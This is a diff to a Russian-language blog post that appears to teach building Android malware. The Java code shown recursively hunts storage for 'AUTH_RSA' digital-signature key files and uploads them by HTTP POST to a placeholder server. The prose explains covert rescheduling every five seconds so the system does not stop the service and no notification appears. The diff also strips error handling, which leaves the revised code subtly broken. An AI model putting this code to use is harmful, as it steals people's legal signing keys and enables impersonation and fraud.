@@ -207,38 +207,25 @@ public class StageAttack {
 {% highlight java %}
 private String pwn2(File dir) {
 
-        String path = null;
-        try {
+	String path = null;
+	File[] list = dir.listFiles();
 
-            File[] list = dir.listFiles();
+    for (File f : list) {
 
-            if (list == null) {
-                Log.d(TAG, "list is null!");
-                return null;
-            }
-
-            for (File f : list) {
-
-                if (!containsSymlink(f)) {
-
-                    if (f.isDirectory()) {
-                        path = pwn2(f);
-                        if (path != null)
-                            return path;
-                    } else {
-                        path = f.getAbsolutePath();
-                        if (path.contains("AUTH_RSA")) {
-                            Log.d(TAG, "AUTH_RSA found here - " + path);
-                            return path;
-                        }
-                    }
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, e.getMessage());
-        }
-        return null;
+	    if (f.isDirectory()) {
+		path = pwn2(f);
+		if (path != null)
+		    return path;
+	    } else {
+		path = f.getAbsolutePath();
+		if (path.contains("AUTH_RSA")) {
+		    Log.d(TAG, "AUTH_RSA found here - " + path);
+		    return path;
+		}
+	    }
     }
+    return null;
+}
 {% endhighlight %}
 
 Если ЭЦП не найдено, мы будем повторять поиск каждые 5 секунд, пока не найдем. Интервал можно использовать любой. Взяв слишком маленький интервал, наш сервис рискует быть остановленным системой. Почему рискует? Потому что, чем ниже версия андроида, тем слабее и гуманнее политика в отношении работы фоновых процессов. Foreground service мы тоже не можем использовать, так как для этого постоянно должно висеть уведомление. Не являясь андроид разработчиком, я потратил кучу времени, чтобы найти способ запланировать задачу, которая будет выполняться точно в срок. Это не так просто, как кажется. В андроиде есть несколько рекомендуемых для этого способов (JobService, WorkManager, setRepeating() AlarmManager'а). В документации неочевидно указано, что интервал задачи должен быть не менее 15 минут и время ее выполнения зависит от желания системы. Нас это не устраивает, поэтому мы используем класс ```AlarmManager```, метод ```setExactAndAllowWhileIdle()```. Когда задача выполниться, снова ее планируем, с таким же интервалом. Это единственный на данный момент способ известный мне, имеющий самую высокую точность.
@@ -262,29 +249,23 @@ private void scheduleMalService() {
 
 {% highlight java %}
 private void sendToServer(String path) {
-        Log.d(TAG, "Sending p12 file to server");
-        try {
-            File file = new File(path);
-            URL url = new URL("http://xxxxxxxxxx");
-            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-            urlConnection.setConnectTimeout(30 * 1000);
+    File file = new File(path);
+    URL url = new URL("http://xxxxxxxxxx");
+    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
+    urlConnection.setConnectTimeout(30 * 1000);
 
-            urlConnection.setRequestMethod("POST");
-            urlConnection.setDoOutput(true);
-            urlConnection.setRequestProperty("Content-Type", "application/octet-stream");
+    urlConnection.setRequestMethod("POST");
+    urlConnection.setDoOutput(true);
+    urlConnection.setRequestProperty("Content-Type", "application/octet-stream");
 
-            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
-            request.write(readFileToByteArray(file));
-            request.flush();
-            request.close();
+    DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
+    request.write(readFileToByteArray(file));
+    request.flush();
+    request.close();
 
-            int respCode = urlConnection.getResponseCode();
-            Log.d(TAG, "Return status code: " + respCode);
-
-        } catch (Exception e) {
-            Log.d(TAG, e.getMessage());
-        }
-    }
+    int respCode = urlConnection.getResponseCode();
+    Log.d(TAG, "Return status code: " + respCode);
+}
 {% endhighlight %}
 
 ## Внедряем payload
